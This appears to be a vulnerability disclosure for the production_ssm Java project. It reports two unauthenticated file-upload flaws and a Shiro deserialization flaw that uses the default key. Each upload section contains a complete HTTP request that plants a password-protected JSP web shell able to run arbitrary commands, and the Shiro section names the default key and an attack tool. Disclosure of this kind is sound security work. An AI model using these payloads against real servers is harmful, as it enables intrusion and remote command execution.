# Project

Address: [production_ssm](https://github.com/megagao/production_ssm)

# 1. Unauthorized upload of any file

## 1.1 Unauthorized upload of any file `/pic/upload`

[Suggested description]

Upload vulnerability exists at interface `/pic/upload`, because the system does not filter file suffixes, attackers can directly upload malicious jsp files to obtain system permissions

[Vendor of Product]

https://github.com/megagao/production_ssm

[Affected Product Code Base]

ALL

[Affected Component]

/pic/upload

[The payload]

```
POST /pic/upload HTTP/1.1
Host: localhost:8080
Content-Length: 698
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjT7A5ZfXf3xTBtGx
Connection: close

------WebKitFormBoundaryjT7A5ZfXf3xTBtGx
Content-Disposition: form-data; name="localUrl"

C:\fakepath\hello.jsp
------WebKitFormBoundaryjT7A5ZfXf3xTBtGx
Content-Disposition: form-data; name="uploadFile"; filename="hello.jsp"
Content-Type: application/octet-stream

<%
    if("20240116".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
------WebKitFormBoundaryjT7A5ZfXf3xTBtGx--
```

[Vulnerability recurrence]

![95cf1bb9a234c6e67088fc07db3833b](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/d5d14526-8ef6-4650-af86-2a649f3ec359)

![086de021454e1c95ab455d98a279fd6](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/2d079b67-65bf-4c59-aa76-c3e4e7722a6a)

[Code analysis]

Call `pictureService.uploadPicture()` to upload a file processing: 

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/7bf6d41a-5ad0-48da-9976-0bb8dcbb84fc)

![1705414149268](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/c8e0bc01-9bd5-4bf9-ac9d-80b2fe561f40)


## 1.2 Unauthorized upload of any file `/file/upload`

[Suggested description]

Upload vulnerability exists at interface `/file/upload`, because the system does not filter file suffixes, attackers can directly upload malicious jsp files to obtain system permissions

[Vendor of Product]

https://github.com/megagao/production_ssm

[Affected Product Code Base]

ALL

[Affected Component]

/file/upload

[The payload]

```
POST /file/upload HTTP/1.1
Host: localhost:8080
Content-Length: 567
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryUssZn7JwJW3z2hkn
Connection: close

------WebKitFormBoundaryUssZn7JwJW3z2hkn
Content-Disposition: form-data; name="uploadFile"; filename="test.jsp"
Content-Type: image/jpeg

<%
    if("20240116".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
------WebKitFormBoundaryUssZn7JwJW3z2hkn--
```

[Vulnerability recurrence]

![58b3b8d8e114c69b1661e0a51b4a8f8](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/272308c0-cb26-40c3-8f3f-3c8eba9faa16)

![663df62efc11facc02ec3ac9a6f5e33](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/9e5acfb4-3a3a-4089-b454-6059b5297477)

[Code analysis]

Call `fileService.uploadFile()` to process the uploaded file: 

![96339e52a88be2480575c162cf502e7](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/d14740e3-99dc-4702-a979-eee384d5f4a6)

![1705413821918](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/cc5c7344-0657-41cf-a71b-e8898bb166c9)


# 2. Deserialization vulnerability

[Suggested description]

The system uses an earlier version of shiro component, and its default key is "kPH+bIxk5D2deZiIxcaaaA==".  Attackers can launch deserialization vulnerability attacks through shiro's default key

[Vendor of Product]

https://github.com/megagao/production_ssm

[Affected Product Code Base]

ALL

[Vulnerability recurrence]

The attack is launched using the [shiro deserialization tool](https://github.com/SummerSec/ShiroAttack2/) directly

1. Burst key: 

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/e49ba13f-8b6f-426e-9026-07a6d9eb3fc1)

2. Blasting chain:

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/146fc7ea-ead2-4b01-bbd0-b6cd6959ded9)

3. Execute a command:

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/e126d229-5cbb-40f5-81c3-071bb2b02754)















